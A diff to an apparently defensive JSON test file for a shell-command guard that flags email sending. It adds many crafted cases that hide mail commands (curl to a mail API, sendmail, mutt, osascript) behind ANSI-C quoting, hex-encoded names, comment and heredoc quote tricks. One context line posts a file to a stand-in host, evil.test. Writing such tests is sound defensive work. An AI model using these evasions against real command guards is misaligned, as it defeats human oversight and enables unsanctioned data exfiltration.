@@ -3903,6 +3903,1021 @@
       "name": "CURLMAILAPI1118: round 11 (review): W10 mail host followed by a backslash and a foreign host",
       "cmd": "curl -d @m.json 'https://api.resend.com\\@evil.test/emails'",
       "expected": false
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): an escaped quote inside $'...' (A, the program on the next line)",
+      "cmd": "echo $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): an escaped quote inside $'...' (A, `;` before the program)",
+      "cmd": "echo $'a\\'b'; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): $'\\'' then a newline and the program (A)",
+      "cmd": "echo $'\\''\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): an escaped backslash, then an escaped quote inside $'...' (A)",
+      "cmd": "echo $'x\\\\\\'y'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): a hex escape, then an escaped quote inside $'...' (A)",
+      "cmd": "echo $'\\x41\\'z'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): $'a\\'b' then a comment, the program on the next line (A)",
+      "cmd": "echo $'a\\'b' # c\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): $'a\\'b' inside $( ) before the program (A)",
+      "cmd": "x=$(echo $'a\\'b'; $X --to a@example.com --body B)",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): bash -c with a double-quoted program: \\$ is $ there (A)",
+      "cmd": "bash -c \"echo \\$'a\\\\'b'\n$X --to a@example.com --body B\"",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): the program in a quoted heredoc for bash (A)",
+      "cmd": "bash <<'EOF'\necho $'a\\'b'\n$X --to a@example.com --body B\nEOF",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): two $'...' words with escaped quotes even out a plain-quote reading (A)",
+      "cmd": "echo $'a\\'b' $'c\\'d'\n$X --to a@example.com --body B\necho $'c\\'d'",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): $'a\\'b' glued between two words (A)",
+      "cmd": "echo x$'a\\'b'y\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): Revizor 5788 M1, S17: `#` inside $'...' after an escaped quote, curl after it (B)",
+      "cmd": "echo $'a\\' # ' ; curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): S17 with an addressed program (B)",
+      "cmd": "echo $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): a `#` and a newline inside $'...' (B)",
+      "cmd": "echo $'a\\' #\n' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): a `;` inside $'...' after an escaped quote (B)",
+      "cmd": "echo $'a\\' ; x' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): a newline inside $'...' after an escaped quote (B)",
+      "cmd": "echo $'a\\'\n'; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): two escaped quotes, then `#` inside $'...' (B)",
+      "cmd": "echo $'\\'\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): S17 inside $( ) (B)",
+      "cmd": "x=$(echo $'a\\' # ' ; $X --to a@example.com --body B)",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): S17 with a newline in place of `;` (B)",
+      "cmd": "echo $'a\\' # '\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): S17 with && (B)",
+      "cmd": "echo $'a\\' # ' && $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): S17 glued to words on both sides (B)",
+      "cmd": "echo x$'a\\' # 'y; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): sh (bash in posix mode reads $'...') in a quoted heredoc",
+      "cmd": "sh <<'EOF'\necho $'a\\'b'\n$X --to a@example.com --body B\nEOF",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): control: $$ then a plain quote, the program runs",
+      "cmd": "echo $$'a\\'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): held stricter than bash (round 4 rule: a $' and a send mark is a send): the $'...' string runs over the newline and closes later, nothing runs",
+      "cmd": "echo $'a\\'\n$X --to a@example.com --body B'",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): held stricter than bash (round 4 rule: a $' and a send mark is a send): the program is text inside the $'...' string, nothing runs",
+      "cmd": "echo $'a\\' ; $X --to a@example.com --body B'",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): control: a read-only line with an escaped quote in $'...'",
+      "cmd": "echo $'it\\'s fine' && ls",
+      "expected": false
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z01x B after a comment line with an apostrophe",
+      "cmd": "# it's\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z01c B after a comment line with an apostrophe",
+      "cmd": "# it's\necho $'a\\' # ' ; curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z02x A after a comment line with an apostrophe",
+      "cmd": "# it's\necho $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z03x B after a trailing comment with an apostrophe",
+      "cmd": "true # don't\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z04x A after a trailing comment with an apostrophe",
+      "cmd": "true # don't\necho $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z05x B after a comment line with a double quote",
+      "cmd": "# say \"hi\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z06x A after a comment line with a double quote",
+      "cmd": "# say \"hi\necho $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z08x B, apostrophe comment AFTER the program",
+      "cmd": "echo $'a\\' # ' ; $X --to a@example.com --body B # it's",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z09x B after an unquoted heredoc body with an apostrophe",
+      "cmd": "cat <<EOF\nit's\nEOF\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z10x A after an unquoted heredoc body with an apostrophe",
+      "cmd": "cat <<EOF\nit's\nEOF\necho $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z11x B after a quoted heredoc body with an apostrophe",
+      "cmd": "cat <<'EOF'\nit's\nEOF\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z12x B after a heredoc body with a double quote",
+      "cmd": "cat <<EOF\nsay \"hi\nEOF\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z34x B after a comment apostrophe, inside bash -c",
+      "cmd": "bash -c \"# it's\necho \\$'a\\\\' # ' ; $X --to a@example.com --body B\"",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z35x B after a comment apostrophe, inside a heredoc for bash",
+      "cmd": "bash <<'EOF'\n# it's\necho $'a\\' # ' ; $X --to a@example.com --body B\nEOF",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z36x B after a comment apostrophe, inside $( )",
+      "cmd": "x=$(\n# it's\necho $'a\\' # ' ; $X --to a@example.com --body B\n)",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z58x B: apostrophe comment line BETWEEN two B lines",
+      "cmd": "echo $'a\\' # ' ; true\n# it's\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z59x B after an apostrophe in a comment on the SAME line as a previous command",
+      "cmd": "echo a # isn't\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): Z60x A after an apostrophe inside a case pattern comment",
+      "cmd": "case x in\n  x) : ;; # don't\nesac\necho $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): K20x comment apostrophe, B, closing apostrophe comment (even count)",
+      "cmd": "# it's\necho $'a\\' # ' ; $X --to a@example.com --body B\n# it's",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): K22x comment apostrophe AFTER B on the next line",
+      "cmd": "echo $'a\\' # ' ; $X --to a@example.com --body B\n# it's",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 2 (Revizor 5843 J1): K24x unbalanced double quote in a comment, then A",
+      "cmd": "# 5\" disk\necho $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D01x arithmetic shift on the line before B",
+      "cmd": "echo $((1<<2))\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D01c arithmetic shift on the line before B",
+      "cmd": "echo $((1<<2))\necho $'a\\' # ' ; curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D02x arithmetic shift on the line before A",
+      "cmd": "echo $((1<<2))\necho $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D04x (( x <<= 1 )) on the line before B",
+      "cmd": "(( x <<= 1 )) ; true\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D05x arithmetic shift with spaces before B",
+      "cmd": "echo $(( 8 >> 1 << 1 ))\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D06x here-string line before B (control)",
+      "cmd": "cat <<< x\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D08x backtick with a comment on the same line as B",
+      "cmd": "echo `true # x` ; echo $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D08c backtick with a comment on the same line as B",
+      "cmd": "echo `true # x` ; echo $'a\\' # ' ; curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D09x comment right after an opening backtick, apostrophe",
+      "cmd": "echo `# it's\ntrue`\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D10x space-hash inside ${x:- } before B",
+      "cmd": "echo ${x:- # y} ; echo $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D11x line continuation, then a comment with an apostrophe",
+      "cmd": "echo a \\\n# it's\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D03x arithmetic shift on the same line as B (control)",
+      "cmd": "x=$((1<<2)) ; echo $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 3 (Revizor 5852 J2): D07x let with a quoted shift before B (control)",
+      "cmd": "let \"x=1<<2\"\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E01x trigger, $[1<<2], B",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E01c trigger, $[1<<2], B",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E02x trigger, a[1<<2]=x, B",
+      "cmd": "# it's\na[1<<2]=x\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E03x trigger, ${a[1<<2]}, B",
+      "cmd": "# it's\na=(1 2 3 4 5); echo ${a[1<<2]}\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E04x trigger, ${x:1<<1}, B",
+      "cmd": "# it's\nx=abcdef; echo ${x:1<<1}\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E05x trigger, if((1<<1)), B",
+      "cmd": "# it's\nif((1<<1)); then true; fi\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E06x trigger, for((i=0;i<1<<1;i++)), B",
+      "cmd": "# it's\nfor((i=0;i<1<<1;i++)); do true; done\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E07x trigger, while((0<<1)), B",
+      "cmd": "# it's\nwhile((0<<1)); do true; done\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E08x trigger, $[1<<2], A",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E17x ${x:-(} then case, then trigger, B",
+      "cmd": "echo ${x:-(}\ncase x in x) true ;; esac\n# it's\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E31x heredoc apostrophe, $[1<<2], B",
+      "cmd": "cat <<EOF\nit's\nEOF\necho $[1<<2]\necho $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 4 (Revizor 5858 J3): E32x heredoc apostrophe, if((1<<1)), A",
+      "cmd": "cat <<EOF\nit's\nEOF\nif((1<<1)); then true; fi\necho $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F01 shift prefix, B, then: flag and address in ANSI-C hex",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; $X $'--t\\x6f' $'a\\x40example.com' --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F02 shift prefix, B, then: mail host in ANSI-C hex, curl",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; curl -d @m.json $'https://api.\\x72esend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F03 shift prefix, B, then: mail host in ANSI-C octal, curl",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; curl -d @m.json $'https://api.\\162esend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F04 shift prefix, B, then: flag in ANSI-C unicode, address in hex",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; $X $'--\\u0074o' $'a\\x40example.com'",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F05 shift prefix, B, then: sendmail in ANSI-C hex",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; $'s\\x65ndmail' -t < m.txt",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F06 if(( prefix, B, then: flag and address in ANSI-C hex",
+      "cmd": "# it's\nif((1<<1)); then true; fi\necho $'a\\' # ' ; $X $'--t\\x6f' $'a\\x40example.com' --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F11 case prefix, B, then: flag and address in ANSI-C hex",
+      "cmd": "echo ${x:-(}\ncase x in x) true ;; esac\n# it's\necho $'a\\' # ' ; $X $'--t\\x6f' $'a\\x40example.com' --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F16 shift prefix, then directly: flag and address in ANSI-C hex",
+      "cmd": "# it's\necho $[1<<2]\n$X $'--t\\x6f' $'a\\x40example.com' --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F19 shift prefix, then directly: flag in ANSI-C unicode, address in hex",
+      "cmd": "# it's\necho $[1<<2]\n$X $'--\\u0074o' $'a\\x40example.com'",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F20 shift prefix, then directly: sendmail in ANSI-C hex",
+      "cmd": "# it's\necho $[1<<2]\n$'s\\x65ndmail' -t < m.txt",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): F21 shift prefix, B, then: mail -s hi tom",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; mail -s hi tom < m.json",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): G01c backslash-newline between $ and the quote, B shape",
+      "cmd": "echo $\\\n'a\\' # ' ; curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): G06x backslash-newline between $ and the quote, B shape",
+      "cmd": "echo $\\\n'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): G07x backslash-newline between $ and the quote, A shape",
+      "cmd": "echo $\\\n'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 review (Revizor 5892 J5): H10 trigger, shift, \"$'\" pair around: flag and address with backslash-letters",
+      "cmd": "# it's\necho $[1<<2]\necho \"$'\" ; echo $'a\\' # ' ; echo \"$'\" ; $X --\\to tom@\\example.com --body B ; echo \"'\"",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 review (Revizor 5892 J5): H11 trigger, shift, \"$'\" pair around: mail host with a backslash-letter, curl",
+      "cmd": "# it's\necho $[1<<2]\necho \"$'\" ; echo $'a\\' # ' ; echo \"$'\" ; curl -d @m.json https://api.\\resend.com/emails ; echo \"'\"",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 6 (Revizor 5907 J6): I01 trigger, shift, \"$'\" before: --to=addr in one hex string",
+      "cmd": "# it's\necho $[1<<2]\necho \"$'\" ; $X $'-\\x2dto=a\\x40example.com' --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 6 (Revizor 5907 J6): I02 trigger, shift, \"$'\" before and between: flag and address in two hex strings",
+      "cmd": "# it's\necho $[1<<2]\necho \"$'\" ; $X $'-\\x2dto' \"$'\" $'a\\x40example.com' --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 6 (Revizor 5907 J6): I04 trigger, shift, \"$'\" before: sendmail in hex",
+      "cmd": "# it's\necho $[1<<2]\necho \"$'\" ; $'s\\x65ndmail' -t < m.json",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 6 (Revizor 5907 J6): I05 comment '# price $' as trigger and opener, shift, --to=addr in one hex string",
+      "cmd": "# price $'\necho $[1<<2]\n$X $'-\\x2dto=a\\x40example.com' --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 6 (Revizor 5907 J6): I06 heredoc body with $' as trigger and opener, shift, --to=addr in one hex string",
+      "cmd": "cat <<EOF\ncost $'\nEOF\necho $[1<<2]\n$X $'-\\x2dto=a\\x40example.com' --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 6 (Revizor 5907 J6): I08 trigger, shift, \"$'\" before, B shape, then --to=addr in one hex string",
+      "cmd": "# it's\necho $[1<<2]\necho \"$'\" ; echo $'a\\' # ' ; echo \"$'\" ; $X $'-\\x2dto=a\\x40example.com' --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 6 (Revizor 5907 J6): I09 trigger, if(( prefix, \"$'\" before: --to=addr in one hex string",
+      "cmd": "# it's\nif((1<<1)); then true; fi\necho \"$'\" ; $X $'-\\x2dto=a\\x40example.com' --body B",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zc K02x comment apostrophe, then no quote",
+      "cmd": "# it's\necho a ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zc K03x comment apostrophe, then plain quote",
+      "cmd": "# it's\necho 'a' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zc K07c no quote inside \"$( )\"",
+      "cmd": "echo \"$(echo a ; curl -d @m.json https://api.resend.com/emails)\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zc K07x no quote inside \"$( )\"",
+      "cmd": "echo \"$(echo a ; $X --to a@example.com --body B)\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zc K08x program alone inside \"$( )\"",
+      "cmd": "echo \"$($X --to a@example.com --body B)\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zc K10x plain quote inside \"$( )\"",
+      "cmd": "echo \"$(echo 'a' ; $X --to a@example.com --body B)\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zc K11x no quote inside double-quoted backticks",
+      "cmd": "echo \"`echo a ; $X --to a@example.com --body B`\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zc K17x no quote with a trailing comment with an apostrophe",
+      "cmd": "echo a ; $X --to a@example.com --body B # it's",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zf F22 shift prefix, B, then: mutt -s hi tom",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; mutt -s hi tom < m.json",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zf F24 shift prefix, B, then: gws gmail send",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; gws gmail users messages send --params x",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zf F26 shift prefix, B, then: osascript Mail",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; osascript -e 'tell application \"Mail\" to send m'",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zf F27 shift prefix, B, then: himalaya send",
+      "cmd": "# it's\necho $[1<<2]\necho $'a\\' # ' ; himalaya message send < m.json",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zf G08x $ from a variable in eval, B shape",
+      "cmd": "d=\\$; eval \"echo ${d}'a\\\\' # ' ; $X --to a@example.com --body B\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zf K12 plain: mutt -s hi tom",
+      "cmd": "echo a ; mutt -s hi tom < m.json",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zf K14 plain: gws gmail send",
+      "cmd": "echo a ; gws gmail users messages send --params x",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zf K16 plain: osascript Mail",
+      "cmd": "echo a ; osascript -e 'tell application \"Mail\" to send m'",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zf K17 plain: himalaya send",
+      "cmd": "echo a ; himalaya message send < m.json",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zg K03 plain: marks from brace expansion",
+      "cmd": "echo a ; $X --t{o,} a@example.{com,} --body B",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zg K04 plain: marks split by continuations",
+      "cmd": "echo a ; $X --t\\\no a@exam\\\nple.com --body B",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zi L04 trigger, shift, \"$'\" before: sendmail: plain s glued to a hex word",
+      "cmd": "# it's\necho $[1<<2]\necho \"$'\" ; s$'\\x65ndmail' -t < m.json",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): proba-zi L05 trigger, shift, \"$'\" before: sendmail over two adjacent hex words",
+      "cmd": "# it's\necho $[1<<2]\necho \"$'\" ; $'s\\x65nd'$'m\\x61il' -t < m.json",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): d10 N1 no ANSI-C: ${x:- # y} then the program",
+      "cmd": "echo ${x:- # y} ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): d10 N2 no ANSI-C, curl",
+      "cmd": "echo ${x:- # y} ; curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): control: a read-only substitution inside double quotes",
+      "cmd": "echo \"today: $(date +%F)\"",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): control: a read-only backtick inside double quotes",
+      "cmd": "echo \"files: `ls | wc -l`\"",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Marveen 5982): mutt -v is a send now (only `mutt -f <mailbox>` is not)",
+      "cmd": "mutt -v",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): control: himalaya lists the inbox",
+      "cmd": "himalaya envelope list",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): control: gws lists messages",
+      "cmd": "gws gmail users messages list --params x",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): control: osascript talks to Finder",
+      "cmd": "osascript -e 'tell application \"Finder\" to get name of every disk'",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): control: a brace expansion of file names",
+      "cmd": "cp notes.{md,bak} /tmp/",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): control: eval of a variable with no send mark",
+      "cmd": "eval \"$cmd\"",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 (card 2104b499): control: a hash inside ${...} with no program after it",
+      "cmd": "echo ${x:- # y}",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J01 comment apostrophe, then K04 (mark split by continuations)",
+      "cmd": "# it's\n$X --t\\\no a@exam\\\nple.com --body B",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J02 comment apostrophe, then K03 (brace expansion)",
+      "cmd": "# it's\n$X --t{o,} a@example.{com,} --body B",
+      "expected": true
+    },
+    {
